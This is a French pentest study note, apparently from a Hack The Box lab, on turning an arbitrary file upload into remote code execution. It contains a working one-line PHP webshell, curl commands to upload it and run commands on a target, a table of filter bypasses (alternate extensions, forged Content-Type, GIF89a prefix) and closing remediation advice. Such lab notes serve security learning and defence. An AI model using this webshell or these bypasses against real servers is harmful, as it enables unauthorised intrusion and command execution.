# 🧩 Arbitrary File Upload → RCE

Lié : [[15 - Arsenal Shells Python]] · [[18 - Cheatsheet Payloads]]

---

## Principe

Si un service accepte un fichier `.php` (ou autre exécutable) et le rend **exécutable** à un emplacement atteignable, on uploade un webshell et on obtient un **RCE**. Un des chemins les plus critiques du web.

---

## Les 3 conditions pour que ça marche

1. **Connaître l'emplacement** du fichier uploadé (ici l'API le révèle : `/uploads/backdoor.php`).
2. Le fichier doit être **rendu/exécuté** en PHP (pas juste stocké en texte).
3. **Pas de restriction** sur les fonctions PHP (`system()` dispo).

## Les 4 absences de protection (points de contrôle)

Sur toute fonctionnalité d'upload, vérifie ces défenses (leur absence = vulnérable) :
- Content-Type filtré ? (ici accepté en `application/x-php`)
- Extensions whitelistées/blacklistées ? (ici `.php` accepté)
- Contenu analysé ? (pas de détection de code PHP)
- Emplacement caché ? (ici l'URL est révélée)

---

## Le backdoor minimal

```php
<?php if(isset($_REQUEST['cmd'])){ $cmd=($_REQUEST['cmd']); system($cmd); die; }?>
```
`$_REQUEST` couvre GET/POST/cookie. `?cmd=id` → exécute `id`.

---

## Exploitation

```bash
# upload (nom de champ à ajuster via Burp/Caido)
curl -X POST -F "file=@backdoor.php" http://<TARGET>:3001/api/upload/

# preuve RCE
curl "http://<TARGET>:3001/uploads/backdoor.php?cmd=id"

# réponse HTB (hostname)
curl "http://<TARGET>:3001/uploads/backdoor.php?cmd=hostname"
```

Webshell interactif + reverse shell : [[15 - Arsenal Shells Python]].

---

## Contournements (cas réels)

Dans l'ordre où on les tente quand une protection existe :

| Protection | Bypass |
|---|---|
| Extension `.php` bloquée | `.phtml`, `.php5`, `.php7`, `.phar`, double ext `.jpg.php`, casse `.pHp` |
| Content-Type vérifié | forcer `Content-Type: image/jpeg` en gardant le contenu PHP (Burp) |
| Contenu vérifié (magic bytes) | préfixer par `GIF89a;` (entête image) |
| Emplacement inconnu | fuzzer `/uploads/`, `/files/`, `/media/` avec ffuf |

Module dédié : *File Upload Attacks* (HTB).

---

## Remédiation

- Whitelist stricte d'extensions **et** de types MIME (vérifiés côté serveur).
- Renommer les fichiers, stocker **hors webroot** ou sans droit d'exécution.
- Ne jamais révéler le chemin final ; scanner le contenu.

Tags : #file-upload #rce #php #webshell
